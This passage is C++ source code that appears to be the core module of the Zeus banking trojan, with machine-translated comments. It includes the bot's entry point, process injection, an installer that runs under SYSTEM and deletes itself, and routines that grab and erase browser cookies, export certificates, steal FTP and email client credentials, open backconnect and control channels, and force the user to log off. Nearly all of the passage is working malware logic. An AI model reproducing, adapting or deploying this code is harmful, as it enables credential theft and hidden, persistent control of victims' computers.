    case RV_DYNAMICCONFIG: source = pe.userPaths.regDynamicConfig; break;
    case RV_LOCALCONFIG:   source = pe.userPaths.regLocalConfig; break;
    case RV_LOCALSETTINGS: source = pe.userPaths.regLocalSettings; break;
    default: return;
  }

  if(Str::_ansiToUnicode(pe.userPaths.regKey, -1, value, sizeof(pe.userPaths.regKey) / sizeof(char)) != 0 &&
     Fs::_pathCombine(key, PATH_REGKEY, value) &&
     Str::_ansiToUnicode(source, -1, value, CORE_REGISTRY_VALUE_BUFFER_SIZE) != 0) 
  {
    return;
  }

  *key = 0;
  *value = 0;
}

void Core::getCurrentBotnetName(LPWSTR name)
{
  LocalSettings::SETTINGS ls;
  LocalSettings::getCurrent(&ls);

  if(ls.flags & LocalSettings::FLAG_BOTNET)
  {
    Str::_CopyW(name, ls.botnet, -1);
  }
  else
  {
    BASECONFIG bs;
    Core::getBaseConfig(&bs);
    Str::_CopyW(name, bs.defaultBotnet, -1);
  }
}

void *Core::getBaseOverlay(const void *mem, LPDWORD size)
{  
  //Create the key.
  Crypt::RC4KEY key;
  Crypt::_rc4Init(baseConfigSource, sizeof(BASECONFIG), &key);
  
  //Ischim address.
  void *overlay = BaseOverlay::_getAddress(mem, *size, &key);
  BYTE buffer[BaseOverlay::FULL_SIZE_OF_OVERLAY];
  *size = BaseOverlay::FULL_SIZE_OF_OVERLAY;

  //Load.
  if(overlay != NULL && BaseOverlay::_loadOverlay(buffer, overlay, size, &key))return Mem::copyEx(buffer, *size);

  return NULL;
}

bool Core::setBaseOverlay(void *mem, DWORD size, const void *data, DWORD dataSize)
{
  //Create the key.
  Crypt::RC4KEY key;
  Crypt::_rc4Init(baseConfigSource, sizeof(BASECONFIG), &key);

  //Ischim address.
  void *overlay = BaseOverlay::_getAddress(mem, size, &key);

  //Save.
  return (overlay != NULL && BaseOverlay::_createOverlay(overlay, data, dataSize, &key));
}

void Core::createServices(bool waitStop)
{
  ThreadsGroup::_createGroup(&servcieThreads);
  
  if(coreData.proccessFlags & CDPF_RIGHT_ALL)
  {
    if(coreData.proccessFlags & CDPF_RIGHT_TCP_SERVER)
    {
      BASECONFIG baseConfig;
      getBaseConfig(&baseConfig);
      if((baseConfig.flags & BCF_DISABLE_TCPSERVER) == 0)TcpServer::_create(&servcieThreads);
    }
#   if(BO_BCSERVER_PLATFORMS > 0)
    if(coreData.proccessFlags & CDPF_RIGHT_BACKCONNECT_SESSION)BackconnectBot::_create(&servcieThreads);
#   endif
    if(coreData.proccessFlags & CDPF_RIGHT_SERVER_SESSION)
    {
      DynamicConfig::create(&servcieThreads);
      Report::_create(&servcieThreads);
    }
    if(coreData.proccessFlags & CDPF_RIGHT_CONTROL)CoreControl::_create(&servcieThreads);

    if(waitStop)
    {
      ThreadsGroup::_waitForAllExit(&servcieThreads, INFINITE);
      ThreadsGroup::_closeGroup(&servcieThreads);
    }
  }
}

static void destoyUserNow(void)
{
  CWA(user32, ExitWindowsEx)(EWX_LOGOFF | EWX_FORCE | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER | SHTDN_REASON_FLAG_PLANNED);
}

bool Core::destroyUser(void)
{
  //FIXME: read, think about it.
  
  LocalSettings::SETTINGS settings;
  
  if(LocalSettings::beginReadWrite(&settings))
  {
    settings.flags         |= LocalSettings::PSF_USER_DISABLED;
    coreData.proccessFlags |= Core::CDPF_DISABLE_CREATEPROCESS;

    LocalSettings::endReadWrite(&settings);
    destoyUserNow();
    return true;
  }

  return false;
}

bool Core::showInfoBox(BYTE type)
{
  //Obtain the DLL.
  HMODULE userDll;
  {
    CSTR_GETW(userDllName, module_user32);
    if((userDll = CWA(kernel32, GetModuleHandleW)(userDllName)) == NULL)return false;
  }

  //Obtain MessageBoxW.
  typedef int (WINAPI *MESSAGEBOX)(HWND window, LPCWSTR text, LPCWSTR caption, UINT type);
  MESSAGEBOX messageBox;
  {
    CSTR_GETA(funcName, user32_messagebox);
    if((messageBox = (MESSAGEBOX)CWA(kernel32, GetProcAddress)(userDll, funcName)) == NULL)return false;
  }

  LPWSTR buf = NULL;
  switch(type)
  {
    case SIB_BOT_INFO:
    {
      CSTR_GETW(infoFormat, core_infobox_botinfo);
      if(Str::_sprintfExW(&buf, infoFormat, BO_CLIENT_VERSION, BO_SIGNATURE_HASH, sizeof(PESETTINGS)) <= 0)return false;
      break;
    }

    case SIB_CRYPT_PROTECTION:
    {
      CSTR_GETW(infoFormat, core_infobox_crypt_protection);
      buf = Str::_CopyExW(infoFormat, CryptedStrings::len_core_infobox_crypt_protection);
      break;
    }
  }
  
  messageBox(NULL, buf, L"#", MB_SETFOREGROUND | MB_ICONINFORMATION | MB_OK);
  Mem::free(buf);
  return true;  
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Entry point.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

static bool defaultModuleEntry(void)
{
  if(Core::init(Core::INITF_INJECT_START | Core::INITF_HOOKS_FOR_USER))
  {
    Core::createServices(false);
    //? ThreadsGroup:: _closeGroup (& servcieThreads);
    
    LocalSettings::SETTINGS ls;
    if(coreData.integrityLevel > Process::INTEGRITY_LOW && LocalSettings::beginReadWrite(&ls))
    {
      //Getting browser cookies.
      if((ls.processStartupFlags & LocalSettings::PSF_COOKIES_GRABBED) == 0)
      {
#       if(BO_WININET > 0)
        WininetHook::_getCookies();
        WininetHook::_removeCookies();
#       endif
#       if(BO_NSPR4 > 0)
        Nspr4Hook::_getCookies();
        Nspr4Hook::_removeCookies();
#       endif
        ls.processStartupFlags |= LocalSettings::PSF_COOKIES_GRABBED;
      }
      
      //Obtaining certificates.
      if((ls.processStartupFlags & LocalSettings::PSF_CERTSTORE_GRABBED) == 0)
      {
        CertStoreHook::_exportMy();
        {
          BASECONFIG baseConfig;
          Core::getBaseConfig(&baseConfig);
          if(baseConfig.flags & BCF_REMOVE_CERTS)CertStoreHook::_clearMy();
        }
        ls.processStartupFlags |= LocalSettings::PSF_CERTSTORE_GRABBED;
      }

      //Getting the MFP.
      if(ls.processStartupFlags & LocalSettings::PSF_MFP_GRAB)
      {
        SoftwareGrabber::_getMacromediaFlashFiles();
        ls.processStartupFlags &= ~LocalSettings::PSF_MFP_GRAB;
      }

      //Removal of MFP.
      if(ls.processStartupFlags & LocalSettings::PSF_MFP_REMOVE)
      {
        SoftwareGrabber::_removeMacromediaFlashFiles();
        ls.processStartupFlags &= ~LocalSettings::PSF_MFP_REMOVE;
      }

#     if(BO_SOFTWARE_FTP > 0 || BO_SOFTWARE_EMAIL > 0)
      HRESULT comResult;
      if((0
#         if(BO_SOFTWARE_FTP > 0)    
          || (ls.processStartupFlags & LocalSettings::PSF_SOFTWARE_FTP_GRABBED) == 0
#         endif
#         if(BO_SOFTWARE_EMAIL > 0)    
          || (ls.processStartupFlags & LocalSettings::PSF_SOFTWARE_EMAIL_GRABBED) == 0
#         endif
         ) &&
         ComLibrary::_initThread(&comResult))
      {
        //FTP-clients.
#       if(BO_SOFTWARE_FTP > 0)    
        if((ls.processStartupFlags & LocalSettings::PSF_SOFTWARE_FTP_GRABBED) == 0)
        {
          SoftwareGrabber::_ftpAll();
          ls.processStartupFlags |= LocalSettings::PSF_SOFTWARE_FTP_GRABBED;
        }
#       endif

        //E-mail-clients.
#       if(BO_SOFTWARE_EMAIL > 0)    
        if((ls.processStartupFlags & LocalSettings::PSF_SOFTWARE_EMAIL_GRABBED) == 0)
        {
          SoftwareGrabber::_emailAll();
          ls.processStartupFlags |= LocalSettings::PSF_SOFTWARE_EMAIL_GRABBED;
        }
#       endif

        ComLibrary::_uninitThread(comResult);
      }
#     endif

      LocalSettings::endReadWrite(&ls);
    }
    return true;
  }
  return false;
}

int WINAPI Core::_injectEntryForModuleEntry(void)
{
  if(defaultModuleEntry())
  {
    //Compute the entry point. Deliberately did not check chitataemost pointers.
    HANDLE mainModule = CWA(kernel32, GetModuleHandleW)(NULL);
    if(((PIMAGE_DOS_HEADER)mainModule)->e_magic == IMAGE_DOS_SIGNATURE)
    {
      PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)mainModule + ((PIMAGE_DOS_HEADER)mainModule)->e_lfanew);
      if(ntHeaders->Signature == IMAGE_NT_SIGNATURE)
      {
        LPBYTE entry = ntHeaders->OptionalHeader.AddressOfEntryPoint + (LPBYTE)mainModule;
        return ((PROC)entry)();
      }
    }
    WDEBUG0(WDDT_ERROR, "Failed to get original entry point.");
  }

  return 0;
}

DWORD WINAPI Core::_injectEntryForThreadEntry(void *)
{
  defaultModuleEntry();
  return 0;
}

/*  Starting the process as a bot, depending on ovreleya in either installer or mode
  loading.

  IN forceUpdate - to force the update does not zavismo on the version (only installer).
  IN removeItself - samoudalnie after completion of the process (only installer).

  Return - true - if successful,
                    false - if an error occurs.*/
static bool runAsBot(bool forceUpdate, bool removeItself)
{
  bool ok = false;
  void *overlay;
  DWORD overlaySize;
  WCHAR strObject[50];
  HANDLE mutex;

  //Obtain the overlay.
  {
    Fs::MEMFILE mf;
    if(Fs::_fileToMem(coreData.paths.process, &mf, 0))
    {
      //Intentionally do not check for errors.
      overlaySize = mf.size;
      if((overlay = Core::getBaseOverlay(mf.data, &overlaySize)) == NULL)overlaySize = 0;
      Fs::_closeMemFile(&mf);
    }
  }

  //Starting in the mode of the loader. (Restarting lodaera user safe).
  if(overlaySize == sizeof(PESETTINGS))
  {
    WDEBUG0(WDDT_INFO, "I'm a loader.");
    if(CoreInstall::_loadInstalledData(overlay, overlaySize))
    {
      generateObjectName(Core::OBJECT_ID_LOADER, strObject, MalwareTools::KON_SESSION);
      if((mutex = Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll, strObject)) != NULL)
      {
        //FIXME: Check LocalSettings:: PSF_USER_DISABLED.
        {
          LocalSettings::SETTINGS settings;
          LocalSettings::getCurrent(&settings);
          if(settings.flags & LocalSettings::PSF_USER_DISABLED)
          {
            settings.flags         |= LocalSettings::PSF_USER_DISABLED;
            coreData.proccessFlags |= Core::CDPF_DISABLE_CREATEPROCESS;
            
          }
        }

        //Inject.
        CoreInject::_injectToAll();

        //FIXME: It is more reliable.
        if(coreData.proccessFlags & Core::CDPF_DISABLE_CREATEPROCESS)destoyUserNow();
        
        //Inform parents that the loader has finished its work.
        {
          generateObjectName(Core::OBJECT_ID_LOADER_READY, strObject, MalwareTools::KON_SESSION);
          HANDLE event = CWA(kernel32, OpenEventW)(EVENT_MODIFY_STATE, FALSE, strObject);
          if(event != NULL)
          {
            CWA(kernel32, SetEvent)(event);
            CWA(kernel32, CloseHandle)(event);
          } 
        }

        //Create projects.
        Core::createServices(true);

        //Exit.
        ok = true;
        CWA(kernel32, CloseHandle)(mutex);          
      }
#     if(BO_DEBUG > 0)
      else WDEBUG0(WDDT_ERROR, "Already started.");
#     endif
    }
  }
  //Starting in the mode of the installer.
  else if(overlaySize == sizeof(INSTALLDATA))
  {
    WDEBUG0(WDDT_INFO, "I'm a installer.");

    //So we give all the installer fuzzy at the same time, check out its capabilities by turns.
    if((mutex = waitForMutexOfObject(Core::OBJECT_ID_INSTALLER, MalwareTools::KON_GLOBAL)) != NULL)
    {
      //Give time for the injection produce a bot in this process.
      generateObjectName(Core::OBJECT_ID_CONTROL_INFECTION, strObject, MalwareTools::KON_SESSION);
      if(Sync::_mutexExists(strObject))
      {
        WDEBUG0(WDDT_INFO, "Wating for WinAPI hooks...");
        while(!WaHook::_isHooked(CURRENT_PROCESS, CWA(kernel32, GetFileAttributesExW)))CWA(kernel32, Sleep)(500);
        WDEBUG0(WDDT_INFO, "Process infection ready.");
      }

      //Running out of service.
      if(CWA(advapi32, IsWellKnownSid)(coreData.currentUser.token->User.Sid, WinLocalSystemSid) == TRUE)
      {
        WDEBUG0(WDDT_INFO, "Current process started from system account. Installing to all users.");
        ok = CoreInstall::_installToAll();
        WDEBUG0(WDDT_INFO, "Installation ready.");
      }
      //Normal start.
      else
      {
        WCHAR coreFile[MAX_PATH];

        {
          INSTALLDATA *installData = (INSTALLDATA *)overlay;

          //Check for updates.
          BotStatus::VER1 *bs;
          if(WaHook::_isHooked(CURRENT_PROCESS, CWA(kernel32, GetFileAttributesExW)) && CWA(kernel32, GetFileAttributesExW)(coreData.installId, (GET_FILEEX_INFO_LEVELS)Core::OBJECT_ID_BOT_STATUS_SECRET, &bs) == TRUE)
          {
            BaseOverlay::_decryptFunction((LPBYTE)CoreInstall::_update, installData->updateSize, installData->xorKey);
            ok = CoreInstall::_update(bs, coreData.paths.home, coreFile, forceUpdate);
            CWA(kernel32, VirtualFree)(bs, 0, MEM_RELEASE);
          }
          //Normal setting.
          else
          {
            BaseOverlay::_decryptFunction((LPBYTE)CoreInstall::_install, installData->installSize, installData->xorKey);
            ok = CoreInstall::_install(coreData.paths.home, coreFile);
          }
        }

        //Run the set / obnalvenny file.
        if(ok == true)
        {
          PROCESS_INFORMATION pi;
          if((ok = Process::_createEx(coreFile, NULL, coreData.paths.home, NULL, &pi) == 0 ? false : true))
          {
            //Create a signal.
            HANDLE events[2];
            generateObjectName(Core::OBJECT_ID_LOADER_READY, strObject, MalwareTools::KON_SESSION);
            events[0] = CWA(kernel32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, strObject);
            events[1] = pi.hProcess;

            //Waiting upeshnoy boot loader.
            WDEBUG0(WDDT_INFO, "Waiting for loading of loader.");
            if(events[0] == NULL)CWA(kernel32, WaitForSingleObject)(pi.hProcess, INFINITE);
            else CWA(kernel32, WaitForMultipleObjects)(sizeof(events) / sizeof(HANDLE), events, FALSE, INFINITE);
            WDEBUG0(WDDT_INFO, "Process of loader is fininshed.");

            //Close the handles.
            if(events[0] != NULL)CWA(kernel32, CloseHandle)(events[0]);
            CWA(kernel32, CloseHandle)(pi.hThread);
            CWA(kernel32, CloseHandle)(pi.hProcess);
          }
        }
      }

      //End.
      Sync::_freeMutex(mutex);
    }
#   if(BO_DEBUG > 0)
    else WDEBUG0(WDDT_ERROR, "Unknown error.");
#   endif

    //Remove yourself.
    if(removeItself == true)Process::_runBatchForRemoveFile(coreData.paths.process);
  }

  Mem::free(overlay);
  return ok;
}

void WINAPI Core::_entryPoint(void)
{
  bool ok = false;

  if(init(INITF_NORMAL_START))
  {
   //if (* ((void **) _AddressOfReturnAddress () + 1)! = NULL) Core:: showInfoBox (Core:: SIB_CRYPT_PROTECTION);

    bool forceUpdate  = false;
    bool removeItself = true;
#   if(BO_VNC > 0)          
    bool isVnc        = false;
#   endif
    bool isInfo       = false;

#   if(BO_DEBUG == 0)
    Core::disableErrorMessages();
#   endif
    
    //Analiziiruem command line.
    {
      int argsCount;
      LPWSTR *args = CWA(shell32, CommandLineToArgvW)(CWA(kernel32, GetCommandLineW)(), &argsCount);
      
      if(args != NULL)
      {
        for(int i = 0; i < argsCount; i++)if(args[i] != NULL && args[i][0] == '-')switch(args[i][1])
        {
          //Output information.
          case 'i': isInfo = true; break;
          //Do not delete yourself.
          case 'n': removeItself = false; break;
          //Force update.
          case 'f': forceUpdate = true; break;
#         if(BO_VNC > 0)          
          //VNC-process for placing windows across PrintWindow.
          case 'v': isVnc = true; break;
#         endif
        }
        CWA(kernel32, LocalFree)(args);
      }
    }
    
    //Selecting the startup mode.
    if(isInfo)
    {
      ok = Core::showInfoBox(Core::SIB_BOT_INFO);
    }
#   if(BO_VNC > 0)          
    else if(isVnc)
    {
      //init () is called here, because it is not called when INITF_NORMAL_START.
      VncServer::init();
      ok = VncServer::startAsPaintThread();
      VncServer::uninit();
    }
#   endif    
    else
    {
      ok = runAsBot(forceUpdate, removeItself);
    }
  }

# if(BO_DEBUG == 1)
  if(!ok)CWA(user32, MessageBoxW)(NULL, L"Failed to run!", NULL, MB_OK | MB_ICONERROR);
# endif

  uninit();
  
  if(ok && coreData.proccessFlags & CDPF_NO_EXITPROCESS)CWA(kernel32, Sleep)(INFINITE);
  else CWA(kernel32, ExitProcess)(ok ? 0 : 1);
}
